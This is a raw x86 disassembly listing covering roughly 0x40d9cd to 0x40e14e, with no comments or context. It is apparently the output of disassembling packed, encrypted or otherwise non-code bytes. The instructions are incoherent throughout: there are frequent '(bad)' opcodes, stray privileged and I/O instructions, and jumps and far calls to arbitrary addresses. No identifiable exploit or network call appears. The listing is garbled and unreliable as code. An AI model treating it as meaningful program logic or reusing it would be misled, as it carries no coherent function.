  40d9cd:	rcl    DWORD PTR [edx+0xe],1
  40d9d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9d1:	jnp    0x40da12
  40d9d3:	add    al,0x78
  40d9d5:	sub    eax,0x8c43cd83
  40d9da:	rcr    eax,1
  40d9dc:	fwait
  40d9dd:	mov    dh,0xd2
  40d9df:	cmp    BYTE PTR [ecx-0x30],bh
  40d9e2:	inc    ebx
  40d9e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9e4:	std    
  40d9e5:	das    
  40d9e6:	or     al,BYTE PTR [ecx+0x48]
  40d9e9:	sub    al,dl
  40d9eb:	cmc    
  40d9ec:	into   
  40d9ed:	mov    WORD PTR [ebx+0x6d],ds
  40d9f0:	push   0x5ee3dce9
  40d9f5:	int    0xbd
  40d9f7:	mov    ds:0x7aaa4ce6,al
  40d9fc:	lods   al,BYTE PTR ds:[esi]
  40d9fd:	mov    ecx,0x1f87404d
  40da02:	gs push ebx
  40da04:	mov    esi,0x660db0c9
  40da09:	fidiv  WORD PTR [esi+0x651c90fd]
  40da0f:	popf   
  40da10:	cld    
  40da11:	test   al,0x34
  40da13:	idiv   DWORD PTR [esi-0x7283e4a7]
  40da19:	inc    edi
  40da1a:	hlt    
  40da1b:	push   edx
  40da1c:	loop   0x40da2d
  40da1e:	js     0x40da45
  40da20:	cmp    eax,DWORD PTR [ecx]
  40da22:	shl    DWORD PTR [ecx+0x237af1be],1
  40da28:	ins    BYTE PTR es:[edi],dx
  40da29:	mov    esi,0xadce534c
  40da2e:	sbb    BYTE PTR [ebx+0x4701e0ab],ah
  40da34:	dec    eax
  40da35:	in     al,dx
  40da36:	div    DWORD PTR [ebx]
  40da38:	pop    ds
  40da39:	outs   dx,DWORD PTR ds:[esi]
  40da3a:	jmp    0x9cb528ab
  40da3f:	xchg   esp,eax
  40da40:	ja     0x40da4c
  40da42:	ja     0x40da3c
  40da44:	xor    bh,0x6a
  40da47:	dec    eax
  40da48:	test   BYTE PTR [edx-0x69],0x3a
  40da4c:	pop    ebp
  40da4d:	jge    0x40d9fb
  40da4f:	push   ds
  40da50:	fst    DWORD PTR [ebp-0x44]
  40da53:	push   ecx
  40da55:	clc    
  40da56:	jle    0x40da92
  40da58:	sbb    bl,dl
  40da5a:	inc    edx
  40da5b:	imul   ecx,eax,0x62
  40da5e:	push   ecx
  40da5f:	cmc    
  40da60:	rcl    edi,cl
  40da62:	mov    dl,0xe2
  40da64:	sbb    al,0xad
  40da66:	mov    edi,0xce418bd4
  40da6b:	adc    cl,ch
  40da6d:	xchg   cl,cl
  40da6f:	mov    dh,0x43
  40da71:	lea    esp,[eax+ecx*2-0x4aa405b1]
  40da78:	add    BYTE PTR [edi+0x346efdbc],al
  40da7e:	add    DWORD PTR [edx+0x60],edi
  40da81:	sbb    ah,BYTE PTR [esi-0x29]
  40da84:	dec    ecx
  40da85:	pop    ds
  40da86:	inc    ecx
  40da87:	loope  0x40da1f
  40da89:	stos   DWORD PTR es:[edi],eax
  40da8a:	test   bh,dh
  40da8c:	int3   
  40da8d:	and    eax,0x8eb14538
  40da92:	test   al,0xaa
  40da94:	push   esp
  40da95:	ja     0x40dae9
  40da97:	cmc    
  40da98:	hlt    
  40da99:	lods   eax,DWORD PTR ds:[esi]
  40da9a:	jnp    0x40da98
  40da9c:	ss jbe 0x40da44
  40da9f:	sahf   
  40daa0:	ret    
  40daa1:	mov    dh,BYTE PTR [ebp+0x34fcffea]
  40daa7:	loop   0x40daa9
  40daa9:	cmp    DWORD PTR [esi],eax
  40daab:	jbe    0x40db11
  40daad:	cdq    
  40daae:	retf   0x9fe1
  40dab1:	scas   al,BYTE PTR es:[edi]
  40dab2:	(bad)  
  40dab4:	outs   dx,BYTE PTR ds:[esi]
  40dab5:	lea    esp,[esp+eax*8]
  40dab8:	add    DWORD PTR [esi],0xedd72c6
  40dabe:	and    BYTE PTR ds:0xb8fc4ea9,cl
  40dac4:	jb     0x40da66
  40dac6:	inc    esp
  40dac7:	mov    ch,0x41
  40dac9:	popa   
  40daca:	mov    BYTE PTR [edx-0x4d806526],ah
  40dad0:	mov    al,0xd0
  40dad2:	push   ecx
  40dad3:	call   0xf47:0x66ad5683
  40dada:	retf   0xc95e
  40dadd:	mov    dl,0xd6
  40dadf:	sbb    eax,0xe04b2459
  40dae4:	add    eax,ebp
  40dae6:	je     0x40daba
  40dae8:	adc    esp,ecx
  40daea:	jge    0x40db36
  40daec:	scas   eax,DWORD PTR es:[edi]
  40daed:	push   ss
  40daee:	cmp    ch,bh
  40daf0:	xchg   cl,al
  40daf2:	mov    ch,0x55
  40daf4:	push   cs
  40daf5:	push   esp
  40daf6:	mov    WORD PTR [ebx-0x56],gs
  40daf9:	retf   0xccab
  40dafc:	retf   0x2b57
  40daff:	(bad)  
  40db00:	cmp    al,0xa7
  40db02:	sbb    cl,0xbd
  40db05:	les    edx,FWORD PTR [ebx+ebx*2-0x21768156]
  40db0c:	aad    0x85
  40db0e:	push   es
  40db0f:	mov    ?,WORD PTR [ebx-0x15c1986b]
  40db15:	popa   
  40db16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db17:	retf   0xe777
  40db1a:	cwde   
  40db1b:	sub    DWORD PTR [esi+0x2],esi
  40db1e:	mov    bl,0xd7
  40db20:	test   BYTE PTR [esi-0x55a40453],al
  40db26:	rol    eax,1
  40db28:	test   dh,0xdf
  40db2b:	and    ecx,ebp
  40db2d:	xor    eax,0x41da084
  40db32:	or     BYTE PTR [eiz*1+0x3f685797],bh
  40db39:	(bad)  
  40db3a:	mov    ecx,0x19622cf4
  40db3f:	icebp  
  40db40:	and    BYTE PTR [edx+0x5b],cl
  40db43:	dec    eax
  40db44:	dec    ecx
  40db45:	adc    al,0xb
  40db47:	hlt    
  40db48:	pop    eax
  40db49:	test   eax,0x75420a4b
  40db4e:	mov    DWORD PTR [edx+ebp*4],edi
  40db51:	xchg   esi,eax
  40db52:	repz dec ecx
  40db54:	cmp    al,0xbc
  40db56:	add    DWORD PTR [ebp+0x70],edi
  40db59:	and    eax,0x2d23488b
  40db5e:	jg     0x40dba8
  40db60:	sbb    cl,BYTE PTR [ebx]
  40db62:	sub    DWORD PTR [edi+0x55],esi
  40db65:	fwait
  40db66:	and    DWORD PTR [edx-0x26bf2637],esi
  40db6c:	std    
  40db6d:	push   ss
  40db6e:	add    eax,DWORD PTR [eax-0x5bdacd91]
  40db74:	(bad)  
  40db75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db77:	mov    dh,0x45
  40db79:	aam    0x14
  40db7b:	fild   DWORD PTR [ebx]
  40db7d:	out    dx,al
  40db7e:	or     DWORD PTR [edi+ebp*1],esi
  40db81:	ja     0x40db88
  40db83:	ret    
  40db84:	mov    ebx,DWORD PTR ds:0x4c2f4ae6
  40db8a:	mov    ecx,0xe8588c7b
  40db8f:	mov    esp,DWORD PTR [edx-0xc0e84e2]
  40db95:	(bad)  
  40db96:	cdq    
  40db97:	leave  
  40db98:	shl    BYTE PTR [ebp+0x546b542c],cl
  40db9e:	and    ah,0x24
  40dba1:	add    eax,0x8887f875
  40dba6:	stos   BYTE PTR es:[edi],al
  40dba7:	cmp    al,BYTE PTR [esi]
  40dba9:	leave  
  40dbaa:	ficomp DWORD PTR [ebx]
  40dbac:	add    edi,esp
  40dbae:	pop    eax
  40dbaf:	call   0xdd5ae3c2
  40dbb4:	and    ah,BYTE PTR [esp]
  40dbb7:	cs xchg ebp,eax
  40dbb9:	ss loope 0x40dba5
  40dbbc:	daa    
  40dbbd:	xchg   ebx,eax
  40dbbe:	dec    edi
  40dbbf:	es and al,0x4e
  40dbc2:	pop    ebx
  40dbc3:	pop    ecx
  40dbc4:	lahf   
  40dbc5:	test   BYTE PTR [ecx],dl
  40dbc7:	pop    ds
  40dbc8:	test   BYTE PTR [ecx+edx*1+0x7f],al
  40dbcc:	mov    al,0x76
  40dbce:	outs   dx,DWORD PTR ds:[esi]
  40dbcf:	jmp    0xe06beefe
  40dbd4:	mov    BYTE PTR [esi-0x8576433],dl
  40dbda:	pushf  
  40dbdb:	adc    BYTE PTR [esp+ebx*8+0x7bdc255b],bl
  40dbe2:	xchg   ah,bh
  40dbe4:	outs   dx,BYTE PTR ds:[esi]
  40dbe5:	cmp    DWORD PTR [ebx-0x1d],edx
  40dbe8:	pop    eax
  40dbe9:	test   DWORD PTR [eax-0x48],0x5a8d7fa7
  40dbf0:	sub    eax,0xe33a1486
  40dbf5:	or     al,BYTE PTR [eax+ecx*2-0x48]
  40dbf9:	xchg   ch,al
  40dbfb:	call   0x2a39664c
  40dc00:	ins    DWORD PTR es:[edi],dx
  40dc01:	xor    edx,ecx
  40dc03:	pop    eax
  40dc04:	sbb    al,0xf4
  40dc06:	xchg   esi,eax
  40dc07:	mov    al,ds:0x78f38a72
  40dc0c:	mov    al,ds:0x3c609d1
  40dc11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc12:	imul   ecx,DWORD PTR [edi+0x168d7d81],0x77
  40dc19:	jecxz  0x40dc89
  40dc1b:	mov    esi,0xace1432
  40dc20:	inc    eax
  40dc21:	imul   edx,DWORD PTR [edx],0x8438ea3a
  40dc27:	pusha  
  40dc28:	xor    al,0xe4
  40dc2a:	push   eax
  40dc2b:	xchg   esp,eax
  40dc2c:	dec    esp
  40dc2d:	fsubrp st(1),st
  40dc2f:	ror    DWORD PTR [eax+0x34f29a7f],0x74
  40dc36:	std    
  40dc37:	stos   DWORD PTR es:[edi],eax
  40dc38:	xor    DWORD PTR [edi+edi*1],eax
  40dc3b:	lock test BYTE PTR [eax-0x6cda9561],bl
  40dc42:	mov    ds:0x852af16b,al
  40dc47:	pop    ds
  40dc48:	inc    DWORD PTR [ecx]
  40dc4a:	arpl   WORD PTR [ebp-0x7b],sp
  40dc4d:	adc    bl,BYTE PTR [ebp+0x16]
  40dc50:	add    DWORD PTR [ebx-0x16643582],esp
  40dc56:	lahf   
  40dc57:	lods   eax,DWORD PTR ds:[esi]
  40dc58:	inc    esi
  40dc59:	iret   
  40dc5a:	add    al,0x55
  40dc5c:	jbe    0x40dc47
  40dc5e:	mov    es,WORD PTR [ecx-0x1b]
  40dc61:	dec    ebp
  40dc62:	pop    esp
  40dc63:	call   0xc97d:0xbc413bf5
  40dc6a:	clc    
  40dc6b:	pop    ss
  40dc6c:	add    eax,0xd476b08d
  40dc71:	hlt    
  40dc72:	xor    esi,edx
  40dc74:	dec    esi
  40dc75:	and    ecx,edi
  40dc77:	repnz imul ecx,ebx,0x97de7f8
  40dc7e:	(bad)  
  40dc80:	(bad)  
  40dc81:	cdq    
  40dc82:	push   edi
  40dc83:	cli    
  40dc84:	retf   
  40dc85:	jmp    edi
  40dc87:	xor    esi,DWORD PTR [bx-0x5b6]
  40dc8c:	das    
  40dc8d:	(bad)  
  40dc8e:	mov    al,ds:0xe48b567b
  40dc93:	sub    DWORD PTR [bp+si],edx
  40dc96:	je     0x40dc86
  40dc98:	sbb    BYTE PTR [ebx-0x64],ch
  40dc9b:	push   es
  40dc9c:	mov    dl,bl
  40dc9e:	mov    esp,0xd29c9719
  40dca3:	mov    esp,eax
  40dca5:	mov    edx,DWORD PTR [esi+ebp*4]
  40dca8:	fwait
  40dca9:	pop    es
  40dcaa:	mov    edi,0xdb50f4f6
  40dcaf:	dec    esp
  40dcb0:	daa    
  40dcb1:	mov    ebx,?
  40dcb3:	das    
  40dcb4:	mov    ebp,0xaf81d18c
  40dcb9:	cmp    bh,bh
  40dcbb:	xor    BYTE PTR [eax+0xc8c5575],ah
  40dcc1:	mov    al,ds:0xb58b66e1
  40dcc6:	shl    BYTE PTR [esi+0x42],cl
  40dcc9:	push   es
  40dcca:	pop    es
  40dccb:	mov    bh,0x9f
  40dccd:	mov    eax,ds:0x2e2083f3
  40dcd2:	rcr    BYTE PTR ds:0xf826c021,cl
  40dcd8:	dec    ebx
  40dcd9:	jmp    0x34f4fda5
  40dcde:	mov    ch,0x67
  40dce0:	shl    BYTE PTR [edx+0x2d08413a],cl
  40dce6:	mov    ch,0xf2
  40dce8:	adc    ebp,ebp
  40dcea:	sub    dh,BYTE PTR [eax+0x44]
  40dced:	xor    eax,0x8cbcfa1b
  40dcf2:	cmp    al,0x6c
  40dcf4:	mov    ebp,0x13df6c5a
  40dcf9:	out    0x57,al
  40dcfb:	ss push edx
  40dcfd:	or     eax,DWORD PTR [ecx-0x3119a451]
  40dd03:	test   BYTE PTR [ebp-0x6c],bh
  40dd06:	jns    0x40dcc1
  40dd08:	lock push esp
  40dd0a:	fwait
  40dd0b:	test   BYTE PTR [edi+0x622e9c70],bh
  40dd11:	dec    ebp
  40dd12:	dec    esp
  40dd13:	cmp    bh,BYTE PTR [ebx]
  40dd15:	int    0x42
  40dd17:	inc    ebx
  40dd18:	lahf   
  40dd19:	inc    esp
  40dd1a:	int3   
  40dd1b:	sbb    DWORD PTR [ecx-0x32],esi
  40dd1e:	xchg   edi,eax
  40dd1f:	jnp    0x40dd40
  40dd21:	(bad)  
  40dd25:	mov    al,ds:0xabcd65f3
  40dd2a:	(bad)  [edx-0x6d00bb56]
  40dd30:	sub    dh,al
  40dd32:	mov    ah,al
  40dd34:	fldenv [ecx]
  40dd36:	outs   dx,BYTE PTR ds:[esi]
  40dd37:	and    DWORD PTR [esi],edx
  40dd39:	mov    cl,dh
  40dd3b:	or     BYTE PTR [ecx+0x6556a970],0xe5
  40dd42:	cld    
  40dd43:	sbb    DWORD PTR [ebp-0x69],ecx
  40dd46:	or     DWORD PTR [ebp-0x4ee19164],edx
  40dd4c:	pop    esp
  40dd4d:	pop    ds
  40dd4e:	or     DWORD PTR ss:[edx+0x1a],ebp
  40dd52:	aas    
  40dd53:	xchg   edi,eax
  40dd54:	in     eax,dx
  40dd55:	sub    BYTE PTR [esi],0x93
  40dd58:	js     0x40ddad
  40dd5a:	mov    cl,0x1a
  40dd5c:	aad    0x74
  40dd5e:	push   ds
  40dd5f:	mov    WORD PTR [ecx+0x2cc23cf6],?
  40dd65:	fist   WORD PTR [ecx]
  40dd67:	sbb    cl,BYTE PTR [edx]
  40dd69:	out    dx,eax
  40dd6a:	loope  0x40dd06
  40dd6c:	loop   0x40ddea
  40dd6e:	stc    
  40dd6f:	int3   
  40dd70:	add    DWORD PTR [edi-0x19],ebp
  40dd73:	mov    ds:0xe0fafc85,al
  40dd78:	retf   
  40dd79:	xor    BYTE PTR [edi-0x4e],dh
  40dd7c:	(bad)  
  40dd7d:	out    dx,eax
  40dd7e:	pop    esp
  40dd7f:	or     eax,DWORD PTR [eax+0x38258dd3]
  40dd85:	and    cl,bh
  40dd87:	mov    bh,0x17
  40dd89:	es int 0x30
  40dd8c:	mov    eax,ds:0xbe960c6e
  40dd91:	aad    0x65
  40dd93:	mov    edi,0xf91918d5
  40dd98:	scas   al,BYTE PTR es:[edi]
  40dd99:	test   BYTE PTR [eax+0x6c],ch
  40dd9c:	push   edx
  40dd9d:	jp     0x40de0f
  40dd9f:	retf   
  40dda0:	fidiv  DWORD PTR [edx-0x36ee9299]
  40dda6:	adc    edi,DWORD PTR [ebx+0x354dfc6a]
  40ddac:	aas    
  40ddad:	xchg   esp,eax
  40ddae:	cmp    al,0x80
  40ddb0:	int    0x34
  40ddb2:	fsubr  DWORD PTR [ebp-0x26]
  40ddb5:	and    al,0x56
  40ddb7:	xchg   DWORD PTR [eax+eiz*4+0x51c76e5f],ebx
  40ddbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddbf:	std    
  40ddc0:	sub    DWORD PTR [ebp+0x4026f36b],ecx
  40ddc6:	jae    0x40ddf0
  40ddc8:	add    al,0xe1
  40ddca:	sbb    eax,0x7fd4abb1
  40ddcf:	mov    esp,0x1873fb16
  40ddd4:	addr16 adc al,0xc7
  40ddd7:	adc    eax,0x129ebe2c
  40dddc:	inc    ecx
  40dddd:	mul    BYTE PTR [ecx]
  40dddf:	in     eax,0xa
  40dde1:	imul   eax,DWORD PTR [ebp-0x3c0f39ac],0x13
  40dde8:	and    al,0x40
  40ddea:	pop    edi
  40ddeb:	sub    DWORD PTR [edx-0x289f8150],esi
  40ddf1:	cmp    al,0x67
  40ddf3:	cmp    al,0x49
  40ddf5:	inc    eax
  40ddf6:	mov    ecx,0x30a1f96c
  40ddfb:	je     0x40de48
  40ddfd:	loop   0x40ddb6
  40ddff:	inc    ecx
  40de00:	xchg   dl,dl
  40de02:	fisttp QWORD PTR [ebp-0x45dd86f0]
  40de08:	sub    bh,BYTE PTR [esi-0x5e]
  40de0b:	mov    dl,0x55
  40de0d:	xlat   BYTE PTR ds:[ebx]
  40de0e:	mov    bl,0xd3
  40de10:	push   eax
  40de11:	sub    BYTE PTR [esi+0x57edeaf2],bl
  40de17:	sbb    DWORD PTR [edx+0x2d2ce8b6],edi
  40de1d:	sbb    cl,cl
  40de1f:	rol    eax,1
  40de21:	lods   al,BYTE PTR ds:[esi]
  40de22:	inc    ebp
  40de23:	pop    ebx
  40de24:	call   0x7330680c
  40de29:	ret    
  40de2a:	mov    BYTE PTR [ecx+0x59],dh
  40de2d:	and    ecx,DWORD PTR [edx]
  40de2f:	(bad)  
  40de30:	jge    0x40de83
  40de32:	sahf   
  40de33:	pop    ebp
  40de34:	cmp    BYTE PTR [ebx+0x56],ch
  40de37:	mov    edi,0x5fd49280
  40de3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de3d:	aas    
  40de3e:	and    bl,BYTE PTR [eax]
  40de40:	xchg   edx,eax
  40de41:	xchg   edx,eax
  40de42:	(bad)  
  40de44:	sub    ah,BYTE PTR [ecx+esi*8]
  40de47:	sub    eax,0xb25d7843
  40de4c:	in     al,0x7e
  40de4e:	add    DWORD PTR [esi+0x382e0aea],eax
  40de54:	pusha  
  40de55:	push   esi
  40de56:	in     al,0x3a
  40de58:	ja     0x40de08
  40de5a:	mov    bh,0xa2
  40de5c:	xchg   ecx,eax
  40de5d:	inc    ecx
  40de5e:	mov    ebp,0x41fcc047
  40de63:	aaa    
  40de64:	cld    
  40de65:	inc    eax
  40de66:	js     0x40ddfb
  40de68:	mov    DWORD PTR [ecx-0x7102357c],edx
  40de6e:	xor    ah,BYTE PTR [edx-0x55ffdf0b]
  40de74:	mov    DWORD PTR [ecx-0x73c08298],0x15fd53bc
  40de7e:	jge    0x40deeb
  40de80:	push   eax
  40de81:	jbe    0x40de7b
  40de83:	fwait
  40de84:	pop    ss
  40de85:	hlt    
  40de86:	outs   dx,BYTE PTR ds:[esi]
  40de87:	pop    edx
  40de88:	out    dx,al
  40de89:	call   0xed42da07
  40de8e:	add    ebx,DWORD PTR [ebp+0x67]
  40de91:	mov    ?,ebp
  40de93:	cdq    
  40de94:	jno    0x40de47
  40de96:	aas    
  40de97:	cmp    al,0x72
  40de99:	dec    esp
  40de9a:	loop   0x40ded6
  40de9c:	nop
  40de9d:	das    
  40de9e:	aad    0x24
  40dea0:	ret    
  40dea1:	jbe    0x40dee4
  40dea3:	(bad)  
  40dea4:	mov    ecx,0x7f691cb9
  40dea9:	mov    edx,DWORD PTR [esp+ebx*1-0xb]
  40dead:	sbb    al,0xf7
  40deaf:	add    eax,0x493fcf71
  40deb4:	push   eax
  40deb5:	mov    ds:0x38ec4fc3,eax
  40deba:	dec    sp
  40debc:	ins    DWORD PTR es:[edi],dx
  40debd:	xchg   edi,eax
  40debe:	fmul   QWORD PTR ds:0x514e3e22
  40dec4:	dec    esi
  40dec5:	push   edx
  40dec6:	je     0x40de83
  40dec8:	popf   
  40dec9:	mov    dl,ah
  40decb:	jle    0x40df2a
  40decd:	inc    esp
  40dece:	xchg   edi,eax
  40decf:	out    dx,eax
  40ded0:	scas   al,BYTE PTR es:[edi]
  40ded1:	push   cs
  40ded2:	cs jnp 0x40df17
  40ded5:	(bad)  
  40ded6:	cmc    
  40ded7:	xor    al,dl
  40ded9:	rcl    BYTE PTR [eiz*1+0x3e4bcd9d],0x8d
  40dee1:	pop    ds
  40dee2:	lea    edx,[esi+0x607e79d9]
  40dee8:	packuswb mm1,mm3
  40deeb:	ja     0x40df05
  40deed:	pusha  
  40deee:	popf   
  40deef:	xchg   DWORD PTR [ebp-0x61],ecx
  40def2:	pop    esi
  40def3:	mov    dh,0xe3
  40def5:	mov    edi,0x1434a86f
  40defa:	mov    eax,0x5eb05950
  40deff:	call   0xf02555ea
  40df04:	in     al,dx
  40df05:	or     eax,0x22965789
  40df0a:	mov    al,0x40
  40df0c:	xchg   esp,eax
  40df0d:	mov    ds:0x300c1abc,eax
  40df12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df13:	ja     0x40deb4
  40df15:	fst    QWORD PTR [edx+ecx*4]
  40df18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df19:	push   es
  40df1a:	retf   0xef94
  40df1d:	xor    al,0x8a
  40df1f:	mov    ?,WORD PTR [edi+0x122de779]
  40df25:	jnp    0x40df40
  40df27:	mov    ss,eax
  40df29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df2a:	mov    al,0x58
  40df2c:	sahf   
  40df2d:	sar    BYTE PTR ds:0xe0d6c8e9,0x7
  40df34:	xor    BYTE PTR [edx+0x634bcc10],ah
  40df3a:	mov    bl,dl
  40df3c:	imul   ecx,DWORD PTR [edx+ebx*8+0x13],0x10
  40df41:	xchg   edi,eax
  40df42:	adc    eax,0x76fee1aa
  40df47:	fs sbb eax,0x3a6faddb
  40df4d:	mov    cl,0xd2
  40df4f:	cdq    
  40df50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df51:	push   es
  40df52:	(bad)  
  40df53:	(bad)  
  40df54:	in     eax,dx
  40df55:	loopne 0x40df65
  40df57:	jmp    0xc168:0xf3a887d2
  40df5e:	jg     0x40df5e
  40df60:	or     BYTE PTR [eax],bh
  40df62:	inc    eax
  40df63:	in     eax,0x79
  40df65:	mov    bh,0x39
  40df67:	(bad)  
  40df68:	cs xchg esp,eax
  40df6a:	test   DWORD PTR [eax+0x5f],ebp
  40df6d:	mov    al,0x91
  40df6f:	lock sub ebx,DWORD PTR [edi-0x64]
  40df73:	bnd je 0x40df3d
  40df76:	out    0x3a,al
  40df78:	adc    BYTE PTR [ebp+0x75623057],ch
  40df7e:	cwde   
  40df7f:	imul   eax,edi,0xffffffd9
  40df82:	loope  0x40df79
  40df84:	cwde   
  40df85:	scas   al,BYTE PTR es:[edi]
  40df86:	mov    al,ds:0x4da00ef8
  40df8b:	inc    esp
  40df8c:	push   ebp
  40df8d:	lods   al,BYTE PTR ds:[esi]
  40df8e:	int3   
  40df8f:	cmp    bl,ch
  40df91:	xchg   ebx,eax
  40df92:	sahf   
  40df93:	xlat   BYTE PTR ds:[bx]
  40df95:	pop    ds
  40df96:	loopne 0x40dfa1
  40df98:	mulps  xmm6,XMMWORD PTR [eax]
  40df9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df9c:	mov    ch,0x95
  40df9e:	cs loope 0x40df70
  40dfa1:	mov    ebx,0xafef1df6
  40dfa6:	or     BYTE PTR [edi+0x41],dh
  40dfa9:	arpl   WORD PTR [edi-0x57],ax
  40dfac:	int3   
  40dfad:	and    esp,DWORD PTR [ebx]
  40dfaf:	inc    edi
  40dfb0:	repz jle 0x40df8b
  40dfb3:	adc    bh,dh
  40dfb5:	pop    edx
  40dfb6:	pop    ebx
  40dfb7:	jae    0x40df8a
  40dfb9:	idiv   al
  40dfbb:	xchg   ecx,eax
  40dfbc:	add    DWORD PTR [eax-0x1c],edx
  40dfbf:	fimul  DWORD PTR [edx]
  40dfc1:	and    eax,0xe60effbc
  40dfc6:	mov    cl,0xa2
  40dfc8:	xchg   edi,eax
  40dfc9:	in     al,0x9e
  40dfcb:	std    
  40dfcc:	mov    ecx,0xb1bedee2
  40dfd1:	inc    esi
  40dfd2:	data16 cld 
  40dfd4:	je     0x40df64
  40dfd6:	arpl   WORD PTR [ebp+0x10e59444],ax
  40dfdc:	outs   dx,BYTE PTR ds:[esi]
  40dfdd:	inc    ebx
  40dfde:	sar    BYTE PTR [ecx],1
  40dfe0:	add    al,0xa8
  40dfe2:	call   0x1badc7fb
  40dfe7:	or     al,0xfe
  40dfe9:	mov    eax,ds:0x9cafeda6
  40dfee:	sahf   
  40dfef:	add    bh,ch
  40dff1:	cmp    al,BYTE PTR [eax]
  40dff3:	dec    ebp
  40dff4:	icebp  
  40dff5:	into   
  40dff6:	jns    0x40e068
  40dff8:	jns    0x40e013
  40dffa:	jg     0x40dffe
  40dffc:	loopne 0x40dffe
  40dffe:	pop    ds
  40dfff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e000:	mov    DWORD PTR [bp+0x1d],edi
  40e004:	mov    ?,WORD PTR [esi+0x3e]
  40e007:	fs data16 xchg ah,bh
  40e00b:	pop    ecx
  40e00c:	jns    0x40dfd0
  40e00e:	sub    dl,BYTE PTR es:[ecx-0x29672fa8]
  40e015:	mov    ds,WORD PTR [eax+0x50]
  40e018:	sbb    DWORD PTR [edx-0x65c28198],ebp
  40e01e:	inc    DWORD PTR [ebx+0x1e]
  40e021:	jb     0x40e030
  40e023:	retf   0x1cf9
  40e026:	adc    eax,0x7739517
  40e02b:	add    edx,DWORD PTR [eax+0x3562e9d8]
  40e031:	pop    ss
  40e032:	jmp    0x6f74502d
  40e037:	push   eax
  40e038:	(bad)  
  40e039:	lock mov edx,0x606a680
  40e03f:	jno    0x40e008
  40e041:	push   edi
  40e042:	test   BYTE PTR [esi],al
  40e044:	inc    edx
  40e045:	cmp    eax,0xf6a4aaff
  40e04a:	pop    ecx
  40e04b:	jmp    0x77d7f857
  40e050:	out    dx,eax
  40e051:	int    0x76
  40e053:	sub    eax,DWORD PTR [ebp+0x0]
  40e056:	lock and BYTE PTR [esi+0x46bbda87],ch
  40e05d:	add    BYTE PTR [eax+0x76],0x9e
  40e061:	retf   0x559b
  40e064:	(bad)  
  40e066:	xor    ch,BYTE PTR [ebx-0x44]
  40e069:	addr16 adc al,0x5
  40e06c:	ret    
  40e06d:	adc    eax,0x1baf1aa4
  40e072:	jbe    0x40e024
  40e074:	jae    0x40e06e
  40e076:	imul   ebp,DWORD PTR [edi-0x4159eca2],0xffffffa0
  40e07d:	fild   QWORD PTR [ecx]
  40e07f:	adc    ebx,DWORD PTR [esp+esi*2]
  40e082:	mov    ch,0xaa
  40e084:	std    
  40e085:	push   ebp
  40e086:	cli    
  40e087:	pop    edx
  40e088:	mov    ch,0x2f
  40e08a:	ja     0x40e056
  40e08c:	in     al,dx
  40e08d:	test   esp,eax
  40e08f:	out    0x27,eax
  40e091:	loop   0x40e077
  40e093:	push   esp
  40e094:	daa    
  40e095:	mov    dh,0x51
  40e097:	jg     0x40e0ce
  40e099:	or     BYTE PTR [ebx-0x4b1aa1fb],ch
  40e09f:	adc    ebx,DWORD PTR [ebp+0x71]
  40e0a2:	lods   eax,DWORD PTR ds:[esi]
  40e0a3:	fcomp  QWORD PTR [ecx]
  40e0a5:	cmc    
  40e0a6:	inc    esp
  40e0a7:	(bad)  [ecx+esi*2+0xee45977]
  40e0ae:	push   esp
  40e0af:	sbb    eax,0x3bbc73dd
  40e0b4:	mov    esp,DWORD PTR [edi-0x3805c617]
  40e0ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0bb:	pop    ebx
  40e0bc:	shr    BYTE PTR [ecx-0x31],0xdc
  40e0c0:	fisub  WORD PTR [ebx]
  40e0c2:	mov    eax,0xfa3bbf0c
  40e0c7:	repz push 0x868650d8
  40e0cd:	cmc    
  40e0ce:	repnz scas al,BYTE PTR es:[edi]
  40e0d0:	sti    
  40e0d1:	jnp    0x40e107
  40e0d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0d4:	sar    BYTE PTR [edx+0x1f5ff536],0x98
  40e0db:	cmp    bl,0x6a
  40e0de:	pusha  
  40e0df:	repnz cmp eax,0x548ec5ca
  40e0e5:	ja     0x40e0b7
  40e0e7:	inc    ebx
  40e0e8:	mov    dl,0xab
  40e0ea:	push   edi
  40e0eb:	loopne 0x40e0e4
  40e0ed:	pushf  
  40e0ee:	retf   
  40e0ef:	fidivr DWORD PTR [edi]
  40e0f1:	inc    esp
  40e0f2:	xchg   ecx,eax
  40e0f3:	or     BYTE PTR [esp+edi*2+0x1beb61a7],bh
  40e0fa:	es fwait
  40e0fc:	aad    0xf6
  40e0fe:	stos   BYTE PTR es:[edi],al
  40e0ff:	pop    ebx
  40e100:	jp     0x40e0f8
  40e102:	ror    BYTE PTR [esi],1
  40e104:	pop    ecx
  40e105:	mov    bl,0x83
  40e107:	in     al,0xcd
  40e109:	push   ebx
  40e10a:	mov    eax,ds:0xa92fab0e
  40e10f:	xor    eax,0xbba70c20
  40e114:	iret   
  40e115:	enter  0x4623,0xf
  40e119:	(bad)  
  40e11a:	leave  
  40e11b:	lods   al,BYTE PTR ds:[esi]
  40e11c:	push   edx
  40e11d:	iret   
  40e11e:	adc    DWORD PTR [ebx],edi
  40e120:	imul   ebx,DWORD PTR [edx+0x12932f51],0x69
  40e127:	push   ds
  40e128:	add    ecx,esp
  40e12a:	enter  0x48b,0xf7
  40e12e:	mov    ebx,0x382bf76e
  40e133:	xchg   ebp,eax
  40e134:	mov    ds:0x4c00100e,eax
  40e139:	ret    
  40e13a:	(bad)  
  40e13b:	sbb    eax,0x17851a24
  40e140:	es adc eax,0xddc3a5c8
  40e146:	and    BYTE PTR [esi-0x718d4074],ah
  40e14c:	addr16 inc ecx
  40e14e:	fcomp  QWORD PTR [edx-0x22d6a70d]
